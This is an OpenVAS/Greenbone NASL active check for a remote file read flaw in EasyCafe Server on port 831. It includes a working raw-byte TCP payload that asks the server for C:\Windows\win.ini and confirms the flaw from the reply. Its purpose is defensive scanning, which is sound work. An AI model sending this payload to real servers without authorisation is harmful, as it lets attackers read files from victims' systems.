# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806927");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2016-01-04 12:52:08 +0530 (Mon, 04 Jan 2016)");
  # nb: Flaw is from 2016 but the VulnCheck CNA had assigned a 2025 for this so don't wonder about
  # the huge gap between creation_date and CVE publishing time.
  script_cve_id("CVE-2025-34119");
  script_name("EasyCafe Server <= 2.2.14 Remote File Read Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(831);
  # nb: In the below exploit only a Windows file is requested. As all info available indicates that
  # the product is only running on Windows and it doesn't make much sense to throw this against all
  # systems these days a Windows specific mandatory key is used here.
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2015/Dec/120");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39102");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/easy-cafe-server-remote-file-disclosure");

  script_tag(name:"summary", value:"EasyCafe Server is prone to a remote file read vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to a remote attacker connecting to port 831 and
  can retrieve a file because the server does not validate the request, and it does not check if it
  has sent the UDP/TCP request which gives us full Read access to the system.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to connect to
  the port and retrieve a file and gives full access to the system.");

  script_tag(name:"affected", value:"EasyCafe Server version 2.2.14 and earlier.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

# nb: Seems to run only on this port.
port = 831;
if(!get_port_state(port))
  exit(0);

if(!sock = open_sock_tcp(port))
  exit(0);

payload = raw_string(0x43, 0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64,
                     0x6f, 0x77, 0x73, 0x5c, 0x77, 0x69, 0x6e, 0x2e,
                     0x69, 0x6e, 0x69) +
          crap(length:237, data:raw_string(0x00)) +
          raw_string(0x01, 0x00, 0x00, 0x00, 0x01);

send(socket:sock, data:payload);
res = recv(socket:sock, length:1000);
close(sock);

# nb: Product seems to run only on Windows and the file to request is included in the binary data
# above so no traversal_files().
if("; for 16-bit app support" >< res && "[extensions]" >< res) {
  report = 'Received response:\n\n' + chomp(res);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
